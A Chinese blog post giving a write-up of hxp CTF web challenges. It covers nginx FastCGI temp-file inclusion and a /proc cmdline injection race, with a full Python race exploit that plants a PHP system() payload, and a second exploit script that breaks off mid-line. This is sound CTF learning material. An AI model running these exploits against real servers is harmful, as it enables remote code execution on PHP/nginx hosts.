<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>HxpCTF2022&amp;2021 Web - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="HxpCTF2022&amp;2021 Web - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/29/HxpCTF2022&amp;2021%20_%20Web/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-29T13:34:24.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>29,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">HxpCTF2022&amp;2021 Web</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="includer’s-revenge"><a href="#includer’s-revenge" class="headerlink" title="includer’s revenge"></a>includer’s revenge</h1><p>考点：nginx缓存文件包含shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;read&#x27;</span> ) === <span class="string">&#x27;read&#x27;</span> ? <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;index.php&#x27;</span>) : <span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>源码内容就很短，裸文件包含<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/#toc_0x00-tldr">https://tttang.com/archive/1395/#toc_0x00-tldr</a><br>根据陆队的文章可以学到一些东西，也就是nginx的缓存文件，当我们的request body过大的时候，会在<code>/var/lib/nginx/fastcgi</code>目录产生缓存文件，文件内容就是我们溢出部分的内容，那么我们只需要来一段不断重复的一句话木马，即可完成LFI FastCGI Temp</p>
<h2 id="官方预期解"><a href="#官方预期解" class="headerlink" title="官方预期解"></a>官方预期解</h2><p>从<a target="_blank" rel="noopener" href="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html</a>拿了一个Demo下来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;, s[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;, name[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a name :&quot;</span>);</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="type">int</span> fd = open((<span class="type">const</span> <span class="type">char</span>*)name, O_CREAT | O_EXCL | O_RDWR, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="number">-1</span>) &#123;</span><br><span class="line">        (<span class="type">void</span>)unlink((<span class="type">const</span> <span class="type">char</span>*)name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a value :&quot;</span>);</span><br><span class="line">    gets(s);</span><br><span class="line"></span><br><span class="line">    write(fd, s, <span class="keyword">sizeof</span>(s));</span><br><span class="line"></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wait for input\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@myserver:~/test# ./main</span><br><span class="line">Enter a name :testfile</span><br><span class="line">fd is 3</span><br><span class="line">Enter a value :aaaaaaaaaaaa</span><br><span class="line">Wait for input</span><br><span class="line">d</span><br><span class="line">aaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<p>在进行输入的时候我们看一下proc&#x2F;fd下的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@myserver:/proc/20006/fd# ps aux | grep main</span><br><span class="line">postgres   592  0.0  0.7 294704 14388 ?        S     2021   7:03 /usr/lib/postgresql/9.5/bin/postgres -D /var/lib/postgresql/9.5/main -c config_file=/etc/postgresql/9.5/main/postgresql.conf</span><br><span class="line">root     20148  0.0  0.0   4356   644 pts/0    S+   11:33   0:00 ./main</span><br><span class="line">root     20153  0.0  0.0  14228   956 pts/1    S+   11:33   0:00 grep --color=auto main</span><br><span class="line">root@myserver:/proc/20006/fd# cd /proc/20148/fd</span><br><span class="line">root@myserver:/proc/20148/fd# ll</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 root root  0 Jan  5 11:33 ./</span><br><span class="line">dr-xr-xr-x 9 root root  0 Jan  5 11:33 ../</span><br><span class="line">lrwx------ 1 root root 64 Jan  5 11:33 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 root root 64 Jan  5 11:33 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 root root 64 Jan  5 11:33 2 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 root root 64 Jan  5 11:33 3 -&gt; /root/test/testfile (deleted)</span><br><span class="line">root@myserver:/proc/20148/fd# cat 3</span><br><span class="line">aaaaaaaaaaaaroot@myserver:/proc/20148/fd#</span><br></pre></td></tr></table></figure>
<p>可以发现出现了缓存文件的内容，内容就是溢出的a字符，但是后面有个deleted意思就是已经给删除，fd下的文件也全都是以软连接的形式存在的，因此当require_once包含时会失败，而且一旦第一次失败，会存入缓存，那么后面的尝试也都会失败，我们就无法条件竞争了</p>
<blockquote>
<p>If a file was deleted while a process holds an open file descriptor:<br>realpath() will return the last path of the file with “ (deleted)” appended to it.<br>open() will return an fd that can be used to read the original file content.</p>
</blockquote>
<p>这里就涉及一个对软链接的bypass，这个见得也比较多，官方给的是&#x2F;proc&#x2F;self&#x2F;fd&#x2F;34&#x2F;..&#x2F;..&#x2F;..&#x2F;34&#x2F;fd&#x2F;9，这样即可绕过这一层判断，然后下面放上exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line">SERVER = <span class="string">&quot;http://192.168.43.103:49153&quot;</span></span><br><span class="line">NGINX_PIDS_CACHE = <span class="built_in">set</span>([<span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>])</span><br><span class="line"><span class="comment"># Set the following to True to use the above set of PIDs instead of scanning:</span></span><br><span class="line">USE_NGINX_PIDS_CACHE = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建会话句柄</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_requests_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="comment"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead</span></span><br><span class="line">    <span class="comment">#自定义HTTP适配器，创建连接池，消除tcp三次握手时延</span></span><br><span class="line">    adapter = requests.adapters.HTTPAdapter(pool_connections=<span class="number">1000</span>, pool_maxsize=<span class="number">10000</span>)</span><br><span class="line">    session.mount(<span class="string">&#x27;http://&#x27;</span>, adapter)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"> </span><br><span class="line"><span class="comment">#获取Nginx主进程pid</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nginx_pids</span>(<span class="params">requests_session</span>):</span><br><span class="line">    <span class="keyword">if</span> USE_NGINX_PIDS_CACHE:</span><br><span class="line">        <span class="keyword">return</span> NGINX_PIDS_CACHE</span><br><span class="line">    nginx_pids = <span class="built_in">set</span>()</span><br><span class="line">    <span class="comment"># Scan up to PID 200</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        cmdline = requests_session.get(SERVER + <span class="string">f&quot;/?action=read&amp;file=/proc/<span class="subst">&#123;i&#125;</span>/cmdline&quot;</span>).text</span><br><span class="line">        <span class="keyword">if</span> cmdline.startswith(<span class="string">&quot;nginx: worker process&quot;</span>):</span><br><span class="line">            nginx_pids.add(i)</span><br><span class="line">    <span class="keyword">return</span> nginx_pids</span><br><span class="line"> </span><br><span class="line"><span class="comment">#向Nginx发送过大Body，使其生成临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">requests_session, body_size=<span class="number">1024000</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># The file path (/bla) doesn&#x27;t need to exist - we simply need to upload a large body to Nginx and fail fast</span></span><br><span class="line">        payload = <span class="string">&#x27;&lt;?php system(&quot;/readflag&quot;);__halt_compiler(); ?&gt;&#x27;</span></span><br><span class="line">        requests_session.post(SERVER + <span class="string">&quot;/?action=read&amp;file=/bla&quot;</span>, data=(payload + (<span class="string">&quot;a&quot;</span> * (body_size - <span class="built_in">len</span>(payload)))))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#循环发送</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_worker</span>(<span class="params">requests_session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_payload(requests_session)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多线程发送Payload</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_multiprocess</span>(<span class="params">requests_session</span>):</span><br><span class="line">    <span class="comment"># Use all CPUs to send the payload as request body for Nginx</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(multiprocessing.cpu_count()):</span><br><span class="line">        p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,))</span><br><span class="line">        p.start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#生成随机路径/proc/pid/cwd/proc/pid/root绕过php软连接stat</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_path_prefix</span>(<span class="params">nginx_pids</span>):</span><br><span class="line">    <span class="comment"># This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/&lt;nginx pid 1&gt;/cwd/proc/&lt;nginx pid 2&gt;/root/proc/&lt;nginx pid 3&gt;/root</span></span><br><span class="line">    path = <span class="string">&quot;&quot;</span></span><br><span class="line">    component_num = random.randint(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(component_num):</span><br><span class="line">        pid = random.choice(nginx_pids)</span><br><span class="line">        <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            path += <span class="string">f&quot;/proc/<span class="subst">&#123;pid&#125;</span>/cwd&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path += <span class="string">f&quot;/proc/<span class="subst">&#123;pid&#125;</span>/root&quot;</span></span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"> </span><br><span class="line"><span class="comment">#遍历读fd文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">requests_session, nginx_pid, fd, nginx_pids</span>):</span><br><span class="line">    nginx_pid_list = <span class="built_in">list</span>(nginx_pids)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        path = generate_random_path_prefix(nginx_pid_list)</span><br><span class="line">        path += <span class="string">f&quot;/proc/<span class="subst">&#123;nginx_pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = requests_session.get(SERVER + <span class="string">f&quot;/?action=include&amp;file=<span class="subst">&#123;path&#125;</span>&quot;</span>).text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> d:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found flag! &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(d)</span><br><span class="line">            exit()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多线程竞争临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_worker</span>(<span class="params">requests_session, nginx_pid, nginx_pids</span>):</span><br><span class="line">    <span class="comment"># Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it&#x27;s very common for the request body FD to open within this range</span></span><br><span class="line">    <span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">45</span>):</span><br><span class="line">        thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids))</span><br><span class="line">        thread.start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多进程竞争临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_multiprocess</span>(<span class="params">requests_session, nginx_pids</span>):</span><br><span class="line">    <span class="keyword">for</span> nginx_pid <span class="keyword">in</span> nginx_pids:</span><br><span class="line">        p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids))</span><br><span class="line">        p.start()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Creating requests session&#x27;</span>)</span><br><span class="line">    requests_session = create_requests_session()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Getting Nginx pids&#x27;</span>)</span><br><span class="line">    nginx_pids = get_nginx_pids(requests_session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[DEBUG] Nginx pids: <span class="subst">&#123;nginx_pids&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Starting payload sending&#x27;</span>)</span><br><span class="line">    send_payload_multiprocess(requests_session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[DEBUG] Starting fd readers&#x27;</span>)</span><br><span class="line">    read_file_multiprocess(requests_session, nginx_pids)</span><br></pre></td></tr></table></figure>
<p>之后通过条件竞争即可获取flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678974653195-401ae1fd-7c4b-4ce2-97c8-b8ce8045d4aa.png#averageHue=%2333332a&clientId=u6c3ab35c-7a14-4&from=paste&height=286&id=u108cd33e&name=image.png&originHeight=286&originWidth=1037&originalType=binary&ratio=1&rotation=0&showTitle=false&size=456070&status=done&style=none&taskId=uef92dc54-7c7c-4c9a-a2e4-e3a0c3e71cd&title=&width=1037" alt="image.png"><br>我觉得是一道非常有意思的题目哈哈哈，就是你电脑的CPU可能给你干碎。。。跑完这个脚本我电脑CPU拉满了</p>
<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>使用Filterchain</p>
<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>考点：compress:&#x2F;&#x2F;zlib缓存文件包含<br>属于是孪生兄弟了这两题<br>考点是用compress:&#x2F;&#x2F;zlib产生的缓存文件，因为不是21年的就不复现了（懒了）</p>
<h1 id="counter"><a href="#counter" class="headerlink" title="counter"></a>counter</h1><p>考点：cmdline文件包含，死亡绕过？<br>说实话外国人考这些题目真是有规律，这三题全是缓存文件包含，每个比赛都有一个侧重点的属于是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rmf</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -f -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;./data&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="variable">$page</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$rmf</span>(<span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$page</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$page</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$page</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>源码审计也就这么多<br>题目的表层意思是只让我们传入数字123，否则就调用rmf函数去删除文件，然后它的file_put_contents中也比较有意思，尾巴后面有个1，意思应该是你能写入的文件内容也只能是数字，你写一次数字加个1，所以没什么用<br>因此应该思考如何利用include_once去进行文件包含，要实现这个目的，首先该文件应该不可写，因为如果可写在上一步就被覆盖了，所以只能是linux自带的一些系统文件<br>这就让人很容易联想到proc目录下的一系列文件，而这里我们需要利用的就是cmdline文件，假如cmdline文件的内容是一段恶意的php代码，那岂不是就可以</p>
<blockquote>
<p>proc&#x2F;xx&#x2F;cmdline这个文件的分割符是\0，并且当调用rm -rf函数时，也会开辟一个cmdline文件</p>
</blockquote>
<p>思路至此成立，通过条件竞争的形式往不断的调用rmf函数，往cmdline注入我们的恶意代码，那么如何找到该pid呢？<br>wp中给出了一种很妙的方法，通过<code>/proc/sys/kernel/ns_last_pid</code>文件，这个文件有什么用呢：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679027072538-28d92812-2303-415b-b042-bd73f7e02ac1.png#averageHue=%23faf9f8&clientId=u93b36dfd-3b7f-4&from=paste&height=121&id=u67e4f4c0&name=image.png&originHeight=121&originWidth=792&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11246&status=done&style=none&taskId=u93262d20-3d64-42f8-a5fa-7828bd884c2&title=&width=792" alt="image.png"><br>也就是你最后一个pid是多少，那么每当我们调用一次cmdline，我们就包含一次这个pid，就可以大大提高竞争效率</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests,threading,time,urllib3</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Reset</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> Done:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;page&quot;</span>:<span class="string">f&quot;abcdef<span class="subst">&#123;encode_payload&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;reset&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.get(url=url,params=data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Read_pid</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> Done:</span><br><span class="line">        r2=requests.get(url=url,params=&#123;</span><br><span class="line">            <span class="string">&quot;page&quot;</span>:<span class="string">&quot;/proc/sys/kernel/ns_last_pid&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">global</span> pid</span><br><span class="line">        pid=<span class="built_in">int</span>(r2.text)</span><br><span class="line">        <span class="comment"># print(&quot;read_last_pid[]&quot;+str(pid))</span></span><br><span 